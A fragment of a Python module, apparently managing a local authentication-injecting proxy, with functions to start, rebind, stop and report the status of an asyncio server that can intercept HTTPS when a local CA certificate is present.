             f"{type(e).__name__}: {e!r}\n{tb}", "warn")
    finally:
        try:
            tls_writer.close()
        except Exception:
            pass


# ── Public API ────────────────────────────────────────────

_proxy_port: int | None = None


async def start_auth_proxy(port: int = 3128) -> dict:
    global _proxy_server, _proxy_port, _request_count, _inject_count
    _log(f"start_auth_proxy requested port={port} "
         f"(current bound={_proxy_port})")

    # If something is bound on a different port, rebind on the requested one.
    if _proxy_server is not None:
        if _proxy_port == port:
            _log(f"Auth proxy already listening on :{port}")
            return {"running": True, "port": port,
                    "message": f"Already running on :{port}"}
        _log(f"Auth proxy was on :{_proxy_port}, rebinding to :{port}")
        try:
            _proxy_server.close()
            await _proxy_server.wait_closed()
        except Exception as e:
            _log(f"Error closing old proxy: {e}", "warn")
        _proxy_server = None
        _proxy_port = None

    has_ca = _ensure_ca()
    _request_count = 0
    _inject_count = 0
    try:
        _proxy_server = await asyncio.start_server(
            _handle_client, "0.0.0.0", port)
    except OSError as e:
        _log(f"FAILED to bind auth proxy on :{port} — {e}", "warn")
        return {"running": False, "port": port,
                "message": f"Bind failed on :{port}: {e}"}
    _proxy_port = port

    ca_path = str(_CA_DIR / "ca.crt") if _CA_DIR else None
    mode = ("BITM (HTTPS injection enabled)" if has_ca
            else "tunnel-only (HTTP injection only)")
    _log(f"Auth proxy STARTED on :{port} — {mode}  (bound to 0.0.0.0)")

    return {
        "running": True,
        "port": port,
        "bitm_enabled": has_ca,
        "ca_cert_path": ca_path,
        "message": f"Proxy on :{port} — {mode}",
    }


async def stop_auth_proxy() -> dict:
    global _proxy_server, _proxy_port
    if _proxy_server is None:
        _log("stop_auth_proxy called but proxy was not running")
        return {"running": False}
    prev = _proxy_port
    _proxy_server.close()
    await _proxy_server.wait_closed()
    _proxy_server = None
    _proxy_port = None
    await _stop_all_auto_sessions()
    _log(f"Auth proxy STOPPED (was on :{prev})")
    return {"running": False}


def get_auth_proxy_status() -> dict:
    return {
        "running": _proxy_server is not None,
        "port": _proxy_port,
        "request_count": _request_count,
        "inject_count": _inject_count,
        "bitm_enabled": _ca_key is not None,
        "ca_cert_path": str(_CA_DIR / "ca.crt") if _CA_DIR else None,
    }
